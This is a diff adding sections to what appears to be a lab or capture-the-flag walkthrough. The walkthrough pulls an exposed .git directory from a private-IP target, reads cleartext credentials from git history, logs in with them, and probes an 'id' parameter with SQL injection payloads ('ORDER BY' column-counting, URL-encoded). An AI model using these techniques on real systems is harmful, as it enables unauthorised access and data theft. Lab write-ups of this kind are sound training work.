@@ -70,8 +70,27 @@ wget -r http://192.168.139.143/.git
 We then checked the git logs and came across clear credentials.
 
 <img width="795" height="366" alt="image" src="https://github.com/user-attachments/assets/23a21f44-5ad4-44a8-9388-ac93cc500015" />
-
 <img width="795" height="366" alt="image" src="https://github.com/user-attachments/assets/901dbe32-86ae-4017-8149-7d1a81ff6526" />
 
 To get cleartext credentials:
 git show a4d900a
+
+# Authentication & Web Access
+Utilized those credentials to access the web application as a legit user:
+     User ID: lanf@admin.com Password: 321
+<img width="780" height="468" alt="image" src="https://github.com/user-attachments/assets/5661872d-da38-451d-95d1-1f94f2b7e31b" />
+<img width="780" height="503" alt="image" src="https://github.com/user-attachments/assets/93b07743-30a0-437c-943a-bdbec69659b8" />
+
+# SQL Injection Exploitation
+We noticed there the GET parameter called ‘id=’ We manually tried sql command (‘) This error strongly suggests a potential SQL Injection (SQLi) vulnerability in the id parameter of dashboard.php.
+<img width="809" height="238" alt="image" src="https://github.com/user-attachments/assets/0b111729-5e13-4638-bedd-6e4c4f4f29a1" />
+
+We mostly benefited from the UNION query. However, we needed to identify the number of columns on that target table. For that, we used the ORDER BY query to see how many columns it stored.
+id=' ORDER BY 5 -- - 
+URL Encoding: %27%20%4f%52%44%45%52%20%42%59%20%35%20%2d%2d%20%2d 
+id=' ORDER BY 6 -- - 
+id=' ORDER BY 7 -- - 
+
+<img width="797" height="425" alt="image" src="https://github.com/user-attachments/assets/e73d9dff-5088-4059-950f-57364393b001" />
+
+
